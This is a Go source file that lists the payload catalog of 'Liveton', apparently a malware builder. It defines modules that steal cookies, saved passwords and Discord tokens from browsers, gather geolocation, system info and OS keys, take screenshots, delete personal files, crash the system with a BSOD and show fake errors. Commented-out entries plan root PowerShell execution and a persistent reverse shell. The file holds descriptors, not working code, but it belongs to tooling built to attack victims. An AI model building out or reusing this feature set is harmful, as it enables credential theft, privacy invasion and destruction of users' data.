package etc

// This file is for keeping track of the currently supported Liveton feature set.

var (
	Features = []Feature{
		{
			Name:        "bsod",
			Description: "Triggers a Blue Screen of Death when execution finishes.",
			Args: []Arg{
				{Name: "stopcode", Datatype: "string", Required: false},
			},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "chrcc",
			Description: "Grabs cookies saved in 20+ chromium browsers",
			Args:        []Arg{},
			Dependencies: []string{
				"chromium.lib.go",
				"browsers.lib.go",
				"storage.lib.go",
			},
		},
		{
			Name:        "chrcookie",
			Description: "Grabs cookies saved in 20+ chromium browsers",
			Args:        []Arg{},
			Dependencies: []string{
				"chromium.lib.go",
				"browsers.lib.go",
				"storage.lib.go",
			},
		},
		{
			Name:        "chrpass",
			Description: "Grabs passwords saved in 20+ chromium browsers",
			Args:        []Arg{},
			Dependencies: []string{
				"chromium.lib.go",
				"browsers.lib.go",
				"storage.lib.go",
			},
		},
		{
			Name:        "error",
			Description: "Displays a custom fake error message when execution finishes",
			Args: []Arg{
				{Name: "title", Datatype: "string", Required: true},
				{Name: "description", Datatype: "string", Required: true},
			},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "geo",
			Description: "Basic Geo Location payload, grabs general location of the connected network",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "geo+",
			Description: "Advanced Geo Location payload, grabs precise geo coordinates of the connected router",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "killdp",
			Description: "Temporarily removes the system's desktop [kills explorer.exe]",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "pcinfo",
			Description: "Grabs general basic system information",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "rmprsnl",
			Description: "Deletes personal files (Documents, Pictures, Videos, etc.)",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		// These will be added eventually, but for now there are still a few kinks that need to be worked out
		//
		//{
		//	Name:        "rexec",
		//	Description: "Run a custom powershell script as root",
		//	Args: []Arg{
		//		{Name: "script", Datatype: "string", Required: true},
		//	},
		//},
		//{
		//	Name:        "lshell",
		//	Description: "Creates a rooted protected Liveton Reverse shell",
		//	Args: []Arg{
		//		{Name: "startup", Datatype: "bool", Required: true},
		//	},
		//},
		{
			Name:        "screenshot",
			Description: "Takes a screenshot of the system",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "shutdown",
			Description: "Triggers a system shutdown when execution finishes",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "syskey",
			Description: "Grabs the OS' activation key & key type",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
		{
			Name:        "token",
			Description: "Attempt to grab all tokens from Discord and 20+ browsers",
			Args:        []Arg{},
			Dependencies: []string{
				"system.lib.go",
			},
		},
	}
)
